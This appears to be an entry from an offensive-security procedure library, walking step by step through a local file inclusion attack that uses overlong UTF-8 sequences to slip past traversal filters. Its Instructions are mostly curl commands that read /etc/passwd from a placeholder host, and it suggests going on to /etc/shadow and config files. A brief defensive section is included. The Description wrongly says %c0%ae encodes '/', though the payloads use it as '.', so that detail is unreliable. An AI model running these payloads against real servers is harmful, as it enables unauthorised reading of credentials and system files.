---
id: 1d49fedb-cf7a-4c44-bb11-ff7d1bd1f57d
name: Basic-LFI-via-UTF-8-Encoding
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:58.088492+00:00'
updated_at: '2023-04-10T20:22:13.465525+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
sub_techniques: []
tags:
  - '[[tags/Basic LFI]]'
  - '[[tags/File Inclusion]]'
  - '[[tags/UTF-8 encoding]]'
commands:
  - '[[commands/curl-send-lfi-utf8-request]]'
platforms:
  - Web
  - Linux
tools: []
validated: true
---

# Basic-LFI-via-UTF-8-Encoding

## Summary

This procedure demonstrates how to exploit a Local File Inclusion (LFI) vulnerability in a web application by using UTF-8 encoding to bypass input filters, allowing an attacker to read sensitive files on the server, such as /etc/passwd, that are outside the web root directory.

## Description

Local File Inclusion (LFI) vulnerabilities occur when a web application includes files based on user-supplied input without proper sanitization, enabling attackers to read arbitrary files on the server. This procedure leverages UTF-8 encoding (specifically, overlong UTF-8 sequences like %c0%ae for '/') to evade filters that block standard path traversal characters (e.g., ../). The technique is particularly effective against applications that decode UTF-8 but fail to normalize or validate overlong encodings. In a typical scenario, the target is a PHP-based web app with an include parameter like ?page= that allows file inclusion. Success grants access to sensitive data like configuration files, passwords, or system logs, potentially leading to further exploitation such as remote code execution if combined with other vulnerabilities.

## Requirements

1. Network access to a vulnerable web application (e.g., HTTP/HTTPS endpoint).
2. Knowledge of the inclusion parameter (e.g., ?page= or ?file=).
3. A tool like curl or a browser with proxy (e.g., Burp Suite) for sending requests.
4. Target server running on a Unix-like system (e.g., Linux) for paths like /etc/passwd.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization, using whitelists for allowed files and blocking path traversal patterns, including encoded variants.
- Use a Web Application Firewall (WAF) to detect and block LFI attempts, including UTF-8 overlong sequences.
- Restrict file system access for the web server process to prevent reading sensitive directories like /etc/.
- Enable logging of all file inclusion attempts and monitor for anomalous requests containing encoded slashes.

## Objectives

1. Bypass LFI filters using UTF-8 encoding to traverse directories.
2. Include and read sensitive server files outside the web root.
3. Extract contents of target files like /etc/passwd for reconnaissance or credential discovery.

## Instructions

### Step 1: Identify the Vulnerable Parameter

**Context**: Determine the file inclusion parameter in the web application, typically through manual testing or error messages. Common parameters include ?page=, ?file=, or ?include=.

Test the parameter with a benign value to confirm inclusion behavior.

**Command** ([[commands/curl-send-lfi-utf8-request]]):
```bash
curl -X GET "http://example.com/index.php?page=index.php" -v
```

> This sends a request to include a known file like index.php. Look for the page content in the response to confirm the parameter works. If it includes the file, proceed to exploitation.

### Step 2: Craft UTF-8 Encoded Path Traversal

**Context**: Replace standard ../ with UTF-8 overlong encodings (%c0%ae%c0%ae for ../) to bypass filters. Aim to reach /etc/passwd by traversing enough directories (e.g., three levels for a typical web root at /var/www/).

Construct the payload: page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd or append %00 to null-terminate if needed.

**Command** ([[commands/curl-send-lfi-utf8-request]]):
```bash
curl -X GET "http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd" -v
```

> The response should display the contents of /etc/passwd if successful. If filtered, try variations like more traversal levels or %00 null byte.

### Step 3: Verify and Extract File Contents

**Context**: Confirm the inclusion by checking for user account listings in /etc/passwd. If successful, adapt the payload for other files like /etc/shadow or config files.

Save the output for analysis.

**Command** ([[commands/curl-send-lfi-utf8-request]]):
```bash
curl -X GET "http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00" -o lfi_output.txt -v
```

> Expected output includes lines like root:x:0:0:root:/root:/bin/bash. Use grep to parse: grep ":x:" lfi_output.txt.
